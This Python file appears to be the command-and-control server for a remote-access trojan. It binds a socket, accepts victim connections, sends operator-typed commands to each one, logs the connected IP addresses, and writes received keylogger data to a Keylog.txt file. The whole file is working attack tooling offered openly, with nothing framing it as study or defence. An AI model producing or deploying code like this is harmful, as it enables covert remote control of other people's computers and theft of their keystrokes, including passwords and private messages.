import os
import socket as soket
import threading as thread
from time import sleep

# port = 5050
sava = soket.gethostbyname(soket.gethostname())

# adrr = (sava,port)
FORMAT = 'utf-8'
DISCONNECT_KEY = 'disconnect'
iplist = []
server = soket.socket(soket.AF_INET,soket.SOCK_STREAM)
server.bind(('127.0.0.1',9999))


def code4_client(conn,addr):
    print(f'NEW CONNECTION{addr}')
    threada2 = thread.Thread(target=sendcomm,args=(conn,addr))
    threada2.start()
    connected = True
    while connected:
        meseg = conn.recv(1048576).decode(FORMAT)
        if meseg == DISCONNECT_KEY:
            connected = False
            print(f'{addr} Disconnected!!')
        elif meseg.startswith('KEYLOGGER-KEYLOGGER') and meseg.endswith('KEYLOGGER-KEYLOGGER'):
            with open(fr'C:\Users\{os.getlogin()}\Downloads\Keylog.txt','w') as keys:
                keys.write(meseg)
            os.system(f'start C:/Users/{os.getlogin()}/Downloads')
        elif len(meseg) != 0:
            print(f'{addr}: {meseg}')
        else:
            connected = False
            conn.close()
def sendcomm(conn,addr):
    while True:
        sleep(4)
        comm = input('Enter Command: ')
        encocomm = comm.encode(FORMAT)
        conn.send(encocomm)

def accept_client():
    server.listen()
    print(f'LISTENING ON {sava}')
    while True:
       conn, addr= server.accept()
       threada = thread.Thread(target=code4_client,args=(conn,addr))
       threada.start()
       iplist.append(addr)
       print(f'[ACTIVE CONNECTIONS] {thread.activeCount()-1}  \nCONNECTIONS IP ADRESSES: {iplist} \n{"-"*100}')

print('SERVER IS STARTING.....')
accept_client()